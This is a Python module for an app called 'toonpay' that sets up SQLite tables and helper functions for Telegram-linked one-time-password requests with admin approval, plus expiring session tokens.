import sqlite3
import os
import time
import secrets
from contextlib import contextmanager

DB_PATH = os.getenv("DATABASE_PATH", "toonpay.db")


def _conn():
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c


@contextmanager
def db():
    c = _conn()
    try:
        yield c
        c.commit()
    finally:
        c.close()


def init_db():
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS otp_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER,
            username TEXT,
            first_name TEXT,
            identifier TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            assigned_otp TEXT,
            entered_otp TEXT,
            admin_decision TEXT,
            created_at INTEGER NOT NULL,
            decided_at INTEGER
        );
        CREATE TABLE IF NOT EXISTS sessions (
            token TEXT PRIMARY KEY,
            telegram_id INTEGER,
            identifier TEXT,
            created_at INTEGER NOT NULL,
            expires_at INTEGER NOT NULL
        );
        """)


def create_request(telegram_id, username, first_name, identifier):
    with db() as c:
        cur = c.execute(
            """INSERT INTO otp_requests
            (telegram_id, username, first_name, identifier, status, created_at)
            VALUES (?, ?, ?, ?, 'pending', ?)""",
            (telegram_id, username, first_name, identifier, int(time.time())),
        )
        return cur.lastrowid


def get_request(req_id):
    with db() as c:
        row = c.execute("SELECT * FROM otp_requests WHERE id=?", (req_id,)).fetchone()
        return dict(row) if row else None


def get_pending_requests():
    with db() as c:
        rows = c.execute(
            "SELECT * FROM otp_requests WHERE status != 'approved' AND status != 'rejected' ORDER BY id DESC LIMIT 30"
        ).fetchall()
        return [dict(r) for r in rows]


def set_assigned_otp(req_id, otp):
    with db() as c:
        c.execute(
            "UPDATE otp_requests SET assigned_otp=?, status='assigned' WHERE id=?",
            (otp, req_id),
        )


def set_entered_otp(req_id, otp):
    with db() as c:
        c.execute(
            "UPDATE otp_requests SET entered_otp=?, status='awaiting_decision' WHERE id=?",
            (otp, req_id),
        )


def set_decision(req_id, decision):
    with db() as c:
        status = "approved" if decision == "correct" else "rejected"
        c.execute(
            "UPDATE otp_requests SET admin_decision=?, status=?, decided_at=? WHERE id=?",
            (decision, status, int(time.time()), req_id),
        )


def create_session(telegram_id, identifier):
    token = secrets.token_urlsafe(32)
    now = int(time.time())
    with db() as c:
        c.execute(
            "INSERT INTO sessions (token, telegram_id, identifier, created_at, expires_at) VALUES (?, ?, ?, ?, ?)",
            (token, telegram_id, identifier, now, now + 86400 * 7),
        )
    return token


def get_session(token):
    with db() as c:
        row = c.execute("SELECT * FROM sessions WHERE token=?", (token,)).fetchone()
        if not row:
            return None
        if row["expires_at"] < int(time.time()):
            return None
        return dict(row)
